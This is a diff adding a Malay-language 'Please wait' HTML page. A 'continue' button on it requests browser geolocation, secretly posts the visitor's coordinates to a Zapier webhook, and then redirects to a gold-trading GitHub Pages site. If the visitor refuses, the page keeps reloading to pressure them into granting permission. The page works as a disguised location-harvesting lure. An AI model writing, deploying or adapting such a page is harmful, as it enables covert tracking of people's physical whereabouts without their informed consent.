@@ -1,0 +1,79 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Please wait...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    #message {
+      font-size: 18px;
+      color: #444;
+      margin-bottom: 20px;
+    }
+    button {
+      font-size: 16px;
+      padding: 10px 20px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="message">Sila tekan butang di bawah untuk teruskan</div>
+  <button onclick="getLocation()">Teruskan</button>
+
+  <script>
+    function getLocation() {
+      document.getElementById("message").innerText = "Meminta kebenaran lokasi...";
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          document.getElementById("message").innerText =
+            "Lokasi berjaya: " + latitude + ", " + longitude;
+
+          // Hantar ke webhook Zapier
+          fetch("https://hooks.zapier.com/hooks/catch/20783712/2xmb6de/", {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: latitude,
+              longitude: longitude
+            })
+          });
+
+          // Redirect selepas 1.5 saat ke link sebenar
+          setTimeout(() => {
+            window.location.href = "https://sniper8712.github.io/tradingemas/";
+          }, 1500);
+
+        }, function(error) {
+          document.getElementById("message").innerText =
+            "Sila buka setting device anda dan benarkan lokasi. Memuat semula dalam 5 saat...";
+          setTimeout(() => {
+            location.reload();
+          }, 5000);
+        });
+      } else {
+        document.getElementById("message").innerText = "Browser tidak menyokong lokasi.";
+      }
+    }
+  </script>
+</body>
+</html>
